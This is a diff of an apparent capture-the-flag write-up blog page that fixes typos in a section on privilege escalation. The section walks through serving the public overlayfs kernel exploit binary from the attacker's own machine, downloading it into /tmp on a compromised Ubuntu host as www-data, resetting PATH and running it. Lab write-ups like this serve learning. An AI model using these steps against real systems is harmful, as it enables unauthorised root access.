@@ -505,7 +505,7 @@ Copyright (C) 2013 Free Software Foundation, Inc.
 This is free software; see the source for copying conditions.  There is NO
 warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 
-</code></pre><p>So we have an old kernelt, which points to the overlayfs exploit. We have gcc too, so that&rsquo;s great. The architecture is base 64. <a class="link" href="https://github.com/lucyoa/kernel-exploits/blob/master/overlayfs/ofs_64"  target="_blank" rel="noopener"
+</code></pre><p>So we have an old kernel, which points to the overlayfs exploit. We have gcc too, so that&rsquo;s great. The architecture is x64. <a class="link" href="https://github.com/lucyoa/kernel-exploits/blob/master/overlayfs/ofs_64"  target="_blank" rel="noopener"
     >Here is the exploit</a>.</p>
 <p>Startup a server on your own machine.</p>
 <pre><code>┌──(kali㉿kali)-[/tmp]
@@ -526,8 +526,8 @@ Saving to: 'ofs_64'
 2021-05-28 01:32:44 (311 KB/s) - 'ofs_64' saved [886664/886664]
 
 www-data@ubuntu:/tmp$ 
-</code></pre><p>Running it however, we get an error. The fixes I saw were all about getting g++ or updating the repository thingies. We do not have internet ;-;</p>
-<p>Checking the PATH was the next best move then. I put the default ubuntu PATH as below, and &hellip;</p>
+</code></pre><p>Running it however, we get an error. The fixes I saw were all about getting g++ or updating the repository thingies. We do not have internet ;-; So, now what?</p>
+<p>Checking the PATH was the next best move. It looked shady, so I put the default ubuntu PATH as below, and &hellip;</p>
 <pre><code>www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 &lt;t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin         
 www-data@ubuntu:/tmp$ ./ofs_64 
